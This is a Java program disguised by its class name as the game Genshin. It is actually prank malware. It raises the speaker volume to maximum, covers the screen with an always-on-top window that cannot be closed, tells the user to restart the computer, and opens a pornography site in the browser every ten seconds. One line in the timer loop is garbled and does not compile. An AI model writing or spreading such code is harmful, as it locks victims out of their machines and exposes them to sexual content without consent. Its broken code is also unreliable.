import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import javax.sound.sampled.*;
import java.net.*;
import java.util.Timer;
import java.util.TimerTask;

public class genshin {
    private static FloatControl volumeControl;

    public static void main(String[] args) {
        try {
            setMaxVolume();

            JFrame frame = new JFrame();
            frame.setUndecorated(true);
            frame.setAlwaysOnTop(true);
            frame.setExtendedState(JFrame.MAXIMIZED_BOTH);
            frame.getContentPane().setBackground(Color.WHITE);
            frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);

            frame.addWindowListener(new WindowAdapter() {
                public void windowClosing(WindowEvent e) {
                    JOptionPane.showMessageDialog(null, "请重启计算机以关闭程序");
                }
            });

            Toolkit.getDefaultToolkit().getSystemEventQueue().push(new EventQueue() {
                protected void dispatchEvent(AWTEvent event) {
                    if (event instanceof WindowEvent) {
                        WindowEvent we = (WindowEvent) event;
                        if (we.getID() == WindowEvent.WINDOW_CLOSING) {
                            return;
                        }
                    }
                    super.dispatchEvent(event);
                }
            });

            frame.setVisible(true);

            Timer timer = new Timer();
            timer.scheduleAtFixedRate(new TimerTask() {
                public void run() {
                    try {
                        Desktop.getDesktop().browse(new URI("https://cn.pornhub.com/view_video.php?viewkey=ph619b3094d101b"));


                                volumeControl.getValue() < volumeControl.getMaximum()) {
                            volumeControl.setValue(volumeControl.getMaximum());
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }, 0, 10000);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void setMaxVolume() {
        try {
            Mixer.Info[] mixerInfos = AudioSystem.getMixerInfo();
            for (Mixer.Info info : mixerInfos) {
                Mixer mixer = AudioSystem.getMixer(info);
                if (mixer.isLineSupported(Port.Info.SPEAKER)) {
                    Port port = (Port)mixer.getLine(Port.Info.SPEAKER);
                    port.open();
                    if(port.isControlSupported(FloatControl.Type.MASTER_GAIN)) {
                        volumeControl = (FloatControl)port.getControl(
                                FloatControl.Type.MASTER_GAIN
                        );
                        volumeControl.setValue(volumeControl.getMaximum());
                    }
                }
            }
        } catch (Exception e) {
            JOptionPane.showMessageDialog(null, "音量控制不可用");
        }
    }
}